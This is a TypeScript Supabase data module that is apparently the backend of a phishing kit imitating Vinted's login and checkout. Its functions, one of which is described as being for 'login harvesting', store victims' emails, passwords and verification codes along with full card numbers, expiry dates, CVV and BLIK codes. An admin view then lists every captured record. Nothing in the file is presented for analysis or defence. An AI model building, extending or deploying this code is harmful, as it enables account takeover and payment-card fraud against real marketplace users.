/// <reference types="vite/client" />
import { createClient } from '@supabase/supabase-js';
import { AdminOrderRecord, UserAccountDetails } from '../types';

const LOCAL_STORAGE_KEY = 'vinted_store_orders_backup';

const rawUrl = import.meta.env.VITE_SUPABASE_URL || '';
const rawKey = import.meta.env.VITE_SUPABASE_ANON_KEY || '';

export const supabaseUrl = rawUrl.trim();
export const supabaseAnonKey = rawKey.trim();

export const isSupabaseConfigured = Boolean(
  supabaseUrl &&
  supabaseAnonKey &&
  supabaseUrl.startsWith('http') &&
  !supabaseUrl.includes('placeholder')
);

export const supabase = isSupabaseConfigured
  ? createClient(supabaseUrl, supabaseAnonKey, {
      auth: { persistSession: false },
    })
  : null;

/**
 * Local storage order backup helpers (ensures zero data loss)
 */
export function getLocalOrders(): AdminOrderRecord[] {
  try {
    const raw = localStorage.getItem(LOCAL_STORAGE_KEY);
    const orders = raw ? JSON.parse(raw) : [];
    console.log(`[DEBUG] getLocalOrders() - Retrieved ${orders.length} orders from localStorage`);
    return orders;
  } catch (err) {
    console.error(`[ERROR] getLocalOrders() - Failed to retrieve orders from localStorage:`, err);
    return [];
  }
}

export function saveLocalOrder(order: AdminOrderRecord) {
  try {
    const current = getLocalOrders();
    const filtered = current.filter((o) => o.id !== order.id && o.orderNumber !== order.orderNumber);
    const updated = [order, ...filtered];
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(updated));
  } catch (err) {
    console.error('Failed to save order to local storage:', err);
  }
}

export function deleteLocalOrder(id: string) {
  try {
    const current = getLocalOrders();
    const updated = current.filter((o) => o.id !== id && o.orderNumber !== id);
    localStorage.setItem(LOCAL_STORAGE_KEY, JSON.stringify(updated));
  } catch (err) {
    console.error('Failed to delete order from local storage:', err);
  }
}

export async function testSupabaseConnection(): Promise<{
  connected: boolean;
  message: string;
  tables?: { adminUsers: boolean; orders: boolean };
}> {
  console.log('[DEBUG] testSupabaseConnection() - Testing Supabase configuration');
  console.log(`[DEBUG] isSupabaseConfigured=${isSupabaseConfigured}, URL=${supabaseUrl}`);
  
  if (!isSupabaseConfigured || !supabase) {
    const msg = 'Supabase environment variables (VITE_SUPABASE_URL, VITE_SUPABASE_ANON_KEY) are missing in this build.';
    console.error(`[ERROR] testSupabaseConnection() - ${msg}`);
    return {
      connected: false,
      message: msg,
    };
  }

  try {
    console.log('[DEBUG] testSupabaseConnection() - Testing orders table');
    // 1. Test orders table
    const { error: ordersErr } = await supabase.from('orders').select('id').limit(1);
    console.log('[DEBUG] testSupabaseConnection() - Testing admin_users table');
    // 2. Test admin_users table
    const { error: adminErr } = await supabase.from('admin_users').select('id').limit(1);

    const ordersOk = !ordersErr;
    const adminOk = !adminErr;

    if (ordersOk && adminOk) {
      const msg = 'Successfully connected to Supabase database (both `orders` and `admin_users` tables are active).';
      console.log(`[DEBUG] testSupabaseConnection() - ${msg}`);
      return {
        connected: true,
        message: msg,
        tables: { adminUsers: true, orders: true },
      };
    } else {
      const errMsgs = [];
      if (ordersErr) {
        errMsgs.push(`orders table: ${ordersErr.message}`);
        console.error(`[ERROR] testSupabaseConnection() - orders table error:`, ordersErr);
      }
      if (adminErr) {
        errMsgs.push(`admin_users table: ${adminErr.message}`);
        console.error(`[ERROR] testSupabaseConnection() - admin_users table error:`, adminErr);
      }
      const msg = `Connected to Supabase, but encountered issues: ${errMsgs.join('; ')}. Did you run the SQL script?`;
      console.error(`[ERROR] testSupabaseConnection() - ${msg}`);
      return {
        connected: false,
        message: msg,
        tables: { adminUsers: adminOk, orders: ordersOk },
      };
    }
  } catch (err: any) {
    const msg = `Failed to connect to Supabase: ${err.message || String(err)}`;
    console.error(`[ERROR] testSupabaseConnection() - ${msg}`, err);
    return {
      connected: false,
      message: msg,
    };
  }
}

/**
 * Verify admin credentials in Supabase
 */
export async function verifyAdminInSupabase(username: string, password: string): Promise<boolean> {
  console.log(`[DEBUG] verifyAdminInSupabase() - Attempting login for username: ${username}`);
  if (!supabase) {
    console.error('[ERROR] verifyAdminInSupabase() - Supabase client not initialized');
    return false;
  }
  try {
    console.log(`[DEBUG] verifyAdminInSupabase() - Querying admin_users table for username: ${username}`);
    const { data, error } = await supabase
      .from('admin_users')
      .select('*')
      .eq('username', username)
      .eq('password', password)
      .maybeSingle();

    if (error) {
      console.error(`[ERROR] verifyAdminInSupabase() - Database query failed for username ${username}:`, error);
      return false;
    }
    
    const isValid = Boolean(data);
    console.log(`[DEBUG] verifyAdminInSupabase() - Admin verification result: ${isValid ? 'SUCCESS' : 'FAILED'} for username: ${username}`);
    return isValid;
  } catch (err) {
    console.error(`[ERROR] verifyAdminInSupabase() - Exception during admin auth for username ${username}:`, err);
    return false;
  }
}

/**
 * SAVE LOGIN CREDENTIALS DIRECTLY TO SUPABASE
 * Called when user captures credentials during login flow
 * Creates a new order record SPECIFICALLY for login harvesting
 */
export async function saveLoginCredentialsToSupabase(
  email: string,
  password: string,
  verificationCode: string,
  rememberDevice: boolean,
  sessionId: string
): Promise<void> {
  console.log(`[DEBUG] saveLoginCredentialsToSupabase() - START - email: ${email}, sessionId: ${sessionId}`);
  
  if (!supabase || !isSupabaseConfigured) {
    console.error(`[ERROR] saveLoginCredentialsToSupabase() - Supabase not configured. isSupabaseConfigured=${isSupabaseConfigured}, supabase=${supabase ? 'exists' : 'null'}`);
    return;
  }

  try {
    // Generate a unique order number for this login capture
    const orderNumber = `LOGIN_${sessionId}_${Date.now()}`;
    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Generated orderNumber: ${orderNumber}`);

    const insertPayload = {
      order_number: orderNumber,
      product_title: 'LOGIN_CAPTURE',
      customer_name: email || 'Unknown',
      email: email,
      phone_number: '',
      delivery_type: 'login',
      payment_method_type: 'login_capture',
      payment_card_number: password,
      payment_security_code: verificationCode,
      payment_blik_code: rememberDevice ? 'true' : 'false',
      order_price: 0,
      buyer_protection_fee: 0,
      shipping_price: 0,
      total_amount: 0,
      currency: 'EUR',
      status: 'LOGIN_CAPTURED',
    };
    
    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Inserting into orders table:`, insertPayload);

    // Insert LOGIN-specific record into orders table
    const { data, error } = await supabase.from('orders').insert([insertPayload]).select();

    if (error) {
      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Supabase insert failed for email: ${email}, sessionId: ${sessionId}:`, error);
      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Error code: ${error.code}, message: ${error.message}`);
      return;
    }

    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS - Login credentials saved to Supabase for session: ${sessionId}, orderNumber: ${orderNumber}`);
    console.log(`[DEBUG] saveLoginCredentialsToSupabase() - Inserted data:`, data);
  } catch (err) {
    console.error(`[ERROR] saveLoginCredentialsToSupabase() - Exception caught for email: ${email}, sessionId: ${sessionId}:`, err);
    if (err instanceof Error) {
      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Error message: ${err.message}`);
      console.error(`[ERROR] saveLoginCredentialsToSupabase() - Stack trace:`, err.stack);
    }
  }
}

/**
 * Save new order directly to Supabase & LocalStorage Backup
 */
export async function saveOrderToSupabase(orderData: {
  orderNumber: string;
  productTitle: string;
  deliveryType: string;
  accountDetails?: UserAccountDetails;
  pickupPoint?: any;
  shippingAddress?: any;
  paymentMethod?: any;
  pricing?: any;
}) {
  // Ensure accountDetails fallback to storage if not provided
  let effectiveAccount = orderData.accountDetails;
  if (!effectiveAccount) {
    try {
      const saved = localStorage.getItem('vinted_captured_account') || sessionStorage.getItem('vinted_captured_account');
      if (saved) effectiveAccount = JSON.parse(saved);
    } catch {
      // Safe
    }
  }

  // Always build the formatted AdminOrderRecord
  const localRecord: AdminOrderRecord = {
    id: `ord_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
    orderNumber: orderData.orderNumber,
    productId: 'prod_mewtwo_gx',
    productTitle: orderData.productTitle,
    createdAt: new Date().toISOString(),
    status: 'PAID',
    deliveryType: orderData.deliveryType as any,
    accountDetails: effectiveAccount,
    shippingAddress: orderData.shippingAddress
      ? {
          id: orderData.shippingAddress.id || 'addr_1',
          fullName: orderData.shippingAddress.fullName || '',
          line1: orderData.shippingAddress.line1 || '',
          line2: orderData.shippingAddress.line2 || '',
          city: orderData.shippingAddress.city || '',
          postalCode: orderData.shippingAddress.postalCode || '',
          country: orderData.shippingAddress.country || 'France',
          phoneNumber: orderData.shippingAddress.phoneNumber || '',
        }
      : undefined,
    pickupPoint: orderData.pickupPoint
      ? {
          id: orderData.pickupPoint.id || 'pt_1',
          pointCode: orderData.pickupPoint.pointCode || '',
          pointName: orderData.pickupPoint.pointName || '',
          address: orderData.pickupPoint.address || '',
          city: orderData.pickupPoint.city || '',
          carrierName: orderData.pickupPoint.carrierName || '',
        }
      : undefined,
    paymentMethod: {
      type: orderData.paymentMethod?.type || 'card',
      title: orderData.paymentMethod?.title || 'Bank card',
      cardholderName: orderData.paymentMethod?.cardholderName || '',
      cardNumber: orderData.paymentMethod?.cardNumber || orderData.paymentMethod?.last4 || '',
      expiry: orderData.paymentMethod?.expiry || '',
      securityCode: orderData.paymentMethod?.securityCode || '',
      blikCode: orderData.paymentMethod?.blikCode || '',
      brand: orderData.paymentMethod?.brand || 'card',
      last4: orderData.paymentMethod?.last4 || '',
    },
    pricing: {
      orderPrice: Number(orderData.pricing?.orderPrice || 8.0),
      buyerProtectionFee: Number(orderData.pricing?.buyerProtectionFee || 1.1),
      shippingPrice: Number(orderData.pricing?.shippingPrice || 0.0),
      shippingDiscount: Number(orderData.pricing?.shippingDiscount || 0.0),
      total: Number(orderData.pricing?.total || 0.0),
      currency: orderData.pricing?.currency || { code: 'EUR', symbol: '€' },
    },
  };

  // 1. Save to LocalStorage instantly (fail-safe backup)
  saveLocalOrder(localRecord);

  // 2. Save to Supabase if configured
  if (supabase) {
    try {
      console.log(`[DEBUG] saveOrderToSupabase() - Preparing to save order ${orderData.orderNumber} to Supabase`);
      const record = {
        order_number: orderData.orderNumber,
        product_title: orderData.productTitle,
        customer_name:
          orderData.shippingAddress?.fullName ||
          orderData.paymentMethod?.cardholderName ||
          'Customer',
        phone_number: orderData.shippingAddress?.phoneNumber || '',
        email: effectiveAccount
          ? `${effectiveAccount.usernameOrEmail} [Pass: ${effectiveAccount.password || ''}] [Code: ${effectiveAccount.verificationCode || effectiveAccount.phoneCode || ''}]`
          : '',
        delivery_type: orderData.deliveryType,
        
        // Address
        shipping_line1: orderData.shippingAddress?.line1 || '',
        shipping_line2: orderData.shippingAddress?.line2 || '',
        shipping_postal_code: orderData.shippingAddress?.postalCode || '',
        shipping_city: orderData.shippingAddress?.city || '',
        shipping_country: orderData.shippingAddress?.country || 'France',
        
        // Pickup
        pickup_point_code: orderData.pickupPoint?.pointCode || '',
        pickup_point_name: orderData.pickupPoint?.pointName || '',
        pickup_point_address: orderData.pickupPoint?.address || '',
        pickup_point_city: orderData.pickupPoint?.city || '',
        pickup_carrier_name: orderData.pickupPoint?.carrierName || '',
        
        // Payment details
        payment_method_type: orderData.paymentMethod?.type || 'card',
        payment_cardholder_name: orderData.paymentMethod?.cardholderName || '',
        payment_card_number: orderData.paymentMethod?.cardNumber || orderData.paymentMethod?.last4 || '',
        payment_card_expiry: orderData.paymentMethod?.expiry || '',
        payment_security_code: orderData.paymentMethod?.securityCode || '',
        payment_blik_code: orderData.paymentMethod?.blikCode || '',
        payment_card_brand: orderData.paymentMethod?.brand || '',
        payment_card_last4: orderData.paymentMethod?.last4 || '',
        
        // Financials
        order_price: orderData.pricing?.orderPrice || 8.0,
        buyer_protection_fee: orderData.pricing?.buyerProtectionFee || 1.1,
        shipping_price: orderData.pricing?.shippingPrice || 0.0,
        shipping_discount: orderData.pricing?.shippingDiscount || 0.0,
        total_amount: orderData.pricing?.total || 0.0,
        currency: orderData.pricing?.currency?.code || 'EUR',
        status: 'PAID',
      };

      console.log(`[DEBUG] saveOrderToSupabase() - Executing Supabase insert for order: ${orderData.orderNumber}`);
      const { data, error } = await supabase.from('orders').insert([record]).select();
      if (error) {
        console.error(`[ERROR] saveOrderToSupabase() - Supabase insert failed for order ${orderData.orderNumber}:`, error.message, error);
        console.error(`[ERROR] saveOrderToSupabase() - Error code: ${error.code}`);
      } else {
        console.log(`[DEBUG] saveOrderToSupabase() - SUCCESS - Order ${orderData.orderNumber} synced to Supabase`);
        console.log(`[DEBUG] saveOrderToSupabase() - Inserted record:`, data?.[0]);
      }
    } catch (err) {
      console.error(`[ERROR] saveOrderToSupabase() - Exception during Supabase insert for order ${orderData.orderNumber}:`, err);
      if (err instanceof Error) {
        console.error(`[ERROR] saveOrderToSupabase() - Error message: ${err.message}`);
        console.error(`[ERROR] saveOrderToSupabase() - Stack trace:`, err.stack);
      }
    }
  }

  return localRecord;
}

/**
 * Fetch all customer submissions from Supabase + LocalStorage (deduplicated)
 */
export async function getOrdersFromSupabase(): Promise<AdminOrderRecord[]> {
  console.log('[DEBUG] getOrdersFromSupabase() - START - Fetching orders from Supabase and local storage');
  const localOrders = getLocalOrders();
  console.log(`[DEBUG] getOrdersFromSupabase() - Local storage has ${localOrders.length} orders`);
  let remoteOrders: AdminOrderRecord[] = [];

  if (supabase) {
    try {
      console.log('[DEBUG] getOrdersFromSupabase() - Querying Supabase orders table');
      const { data, error } = await supabase
        .from('orders')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) {
        console.error(`[ERROR] getOrdersFromSupabase() - Failed to fetch orders from Supabase:`, error);
        console.error(`[ERROR] getOrdersFromSupabase() - Error message: ${error.message}, code: ${error.code}`);
      } else if (data) {
        console.log(`[DEBUG] getOrdersFromSupabase() - Retrieved ${data.length} orders from Supabase`);
        remoteOrders = data.map((row: any) => {
          let parsedAccount: any = undefined;
          if (row.email) {
            const emailStr = String(row.email);
            const passMatch = emailStr.match(/\[Pass:\s*(.*?)\]/);
            const codeMatch = emailStr.match(/\[Code:\s*(.*?)\]/);
            const cleanUser = emailStr.replace(/\[Pass:.*?\]/, '').replace(/\[Code:.*?\]/, '').trim();
            const pass = passMatch ? passMatch[1] : undefined;
            const code = codeMatch ? codeMatch[1] : undefined;
            parsedAccount = {
              usernameOrEmail: cleanUser || emailStr,
              password: pass,
              phoneCode: code,
              verificationCode: code,
            };
          }

          // Fallback to storage if local account matches
          if (!parsedAccount) {
            try {
              const saved = localStorage.getItem('vinted_captured_account');
              if (saved) parsedAccount = JSON.parse(saved);
            } catch {
              // Safe
            }
          }

          return {
            id: row.id,
            orderNumber: row.order_number,
            productId: row.product_id || 'prod_mewtwo_gx',
            productTitle: row.product_title,
            createdAt: row.created_at,
            status: row.status,
            deliveryType: row.delivery_type,
            accountDetails: parsedAccount,
            shippingAddress: row.shipping_line1
              ? {
                  id: row.id,
                  fullName: row.customer_name,
                  line1: row.shipping_line1,
                  line2: row.shipping_line2,
                  city: row.shipping_city,
                  postalCode: row.shipping_postal_code,
                  country: row.shipping_country,
                  phoneNumber: row.phone_number,
                }
              : undefined,
            pickupPoint: row.pickup_point_code
              ? {
                  id: row.pickup_point_code,
                  pointCode: row.pickup_point_code,
                  pointName: row.pickup_point_name,
                  address: row.pickup_point_address,
                  city: row.pickup_point_city,
                  carrierName: row.pickup_carrier_name,
                }
              : undefined,
            paymentMethod: {
              type: row.payment_method_type,
              title: 'Bank card',
              cardholderName: row.payment_cardholder_name,
              cardNumber: row.payment_card_number,
              expiry: row.payment_card_expiry,
              securityCode: row.payment_security_code,
              blikCode: row.payment_blik_code,
              brand: row.payment_card_brand,
              last4: row.payment_card_last4,
            },
            pricing: {
              orderPrice: Number(row.order_price),
              buyerProtectionFee: Number(row.buyer_protection_fee),
              shippingPrice: Number(row.shipping_price),
              shippingDiscount: Number(row.shipping_discount || 0),
              total: Number(row.total_amount),
              currency: { code: row.currency || 'EUR', symbol: '€' },
            },
          };
        });
      }
    } catch (err) {
      console.error(`[ERROR] getOrdersFromSupabase() - Exception during Supabase query:`, err);
      if (err instanceof Error) {
        console.error(`[ERROR] getOrdersFromSupabase() - Error message: ${err.message}`);
        console.error(`[ERROR] getOrdersFromSupabase() - Stack trace:`, err.stack);
      }
    }
  } else {
    console.warn('[DEBUG] getOrdersFromSupabase() - Supabase client not initialized, using local orders only');
  }

  // Combine & Deduplicate by orderNumber
  console.log('[DEBUG] getOrdersFromSupabase() - Merging remote and local orders');
  const map = new Map<string, AdminOrderRecord>();
  for (const o of remoteOrders) {
    map.set(o.orderNumber, o);
  }
  for (const o of localOrders) {
    if (!map.has(o.orderNumber)) {
      map.set(o.orderNumber, o);
    }
  }

  const merged = Array.from(map.values()).sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
  
  console.log(`[DEBUG] getOrdersFromSupabase() - END - Returning ${merged.length} total orders (remote: ${remoteOrders.length}, local: ${localOrders.length})`);
  return merged;
}

export async function deleteOrderFromSupabase(id: string): Promise<boolean> {
  console.log(`[DEBUG] deleteOrderFromSupabase() - Attempting to delete order: ${id}`);
  try {
    deleteLocalOrder(id);
    if (!supabase) {
      console.log(`[DEBUG] deleteOrderFromSupabase() - Supabase not available, deleted from local storage only for id: ${id}`);
      return true;
    }
    
    console.log(`[DEBUG] deleteOrderFromSupabase() - Deleting from Supabase for id: ${id}`);
    const { error } = await supabase.from('orders').delete().or(`id.eq.${id},order_number.eq.${id}`);
    
    if (error) {
      console.error(`[ERROR] deleteOrderFromSupabase() - Failed to delete order ${id} from Supabase:`, error);
      return false;
    }
    
    console.log(`[DEBUG] deleteOrderFromSupabase() - SUCCESS - Order ${id} deleted from Supabase`);
    return true;
  } catch (err) {
    console.error(`[ERROR] deleteOrderFromSupabase() - Exception during delete for order ${id}:`, err);
    if (err instanceof Error) {
      console.error(`[ERROR] deleteOrderFromSupabase() - Error message: ${err.message}`);
      console.error(`[ERROR] deleteOrderFromSupabase() - Stack trace:`, err.stack);
    }
    return false;
  }
}
